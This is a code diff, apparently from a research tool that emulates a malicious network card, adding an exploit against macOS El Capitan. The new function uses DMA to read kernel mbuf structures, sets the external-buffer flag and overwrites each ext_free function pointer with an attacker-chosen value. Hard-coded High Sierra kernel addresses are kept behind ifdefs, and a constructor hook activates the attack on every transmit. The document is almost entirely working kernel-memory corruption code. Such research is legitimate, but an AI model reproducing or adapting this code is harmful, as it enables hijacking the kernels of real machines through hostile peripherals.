@@ -57,7 +57,6 @@
  */
 
 #ifdef VICTIM_MACOS
-#include "macos-stub-mbuf-high-sierra.h"
 #include "macos-mbuf-manipulation.h"
 #else
 #include <sys/param.h>
@@ -662,6 +661,7 @@ save_mbufs_to_file(E1000ECore* core, ConstDescriptorP desc)
 	fflush(stdout);
 }
 
+#ifdef VICTIM_MACOS_HIGH_SIERRA
 const static uint64_t HIGH_SIERRA_BIGFREE =			0xffffff8000baa2d0;
 const static uint64_t HIGH_SIERRA_16KFREE =			0xffffff8000baa300;
 const static uint64_t HIGH_SIERRA_MCACHE_PANIC =	0xffffff8000b78580;
@@ -722,11 +722,46 @@ attack_high_sierra(E1000ECore* core, ConstDescriptorP desc)
 		}
 	}
 }
+#endif
+
+#ifdef VICTIM_MACOS_EL_CAPITAN
+void
+attack_el_capitan(E1000ECore* core, ConstDescriptorP desc)
+{
+	if (desc->buffer_addr % MCLBYTES == 0) {
+		return;
+	}
+	hwaddr page_addr = page_base_address(desc->buffer_addr);
+	if (page_was_read(page_addr)) {
+		return;
+	}
+	mark_page_read(page_addr);
+	putchar('m');
+	fflush(stdout);
+
+	struct mbuf mbuf;
+	uint64_t mbuf_address;
+	for (uint i = 0; i < MBUFS_PER_PAGE; ++i) {
+		mbuf_address = page_addr + i * sizeof(mbuf);
+		perform_dma_read((uint8_t *)&mbuf, sizeof(mbuf),
+			core->owner->devfn, 8, mbuf_address);
+		endianness_swap_mac_mbuf_header(&mbuf);
+		mbuf.m_hdr.mh_flags |= M_EXT;
+		mbuf.m_ext.ext_free = 0xFEEDBEDEDEADBEEF;
+		endianness_swap_mac_mbuf_header(&mbuf);
+		perform_dma_write((uint8_t *)&mbuf, sizeof(mbuf),
+			core->owner->devfn, 8, mbuf_address);
+	}
+
+}
+
+#endif
 
 
 __attribute__((constructor)) void
 setup_attack()
 {
 	reset_read_pages();
-	register_pre_xmit_hook(attack_high_sierra, reset_read_pages);
+	/*register_pre_xmit_hook(attack_high_sierra, reset_read_pages);*/
+	register_pre_xmit_hook(attack_el_capitan, reset_read_pages);
 }
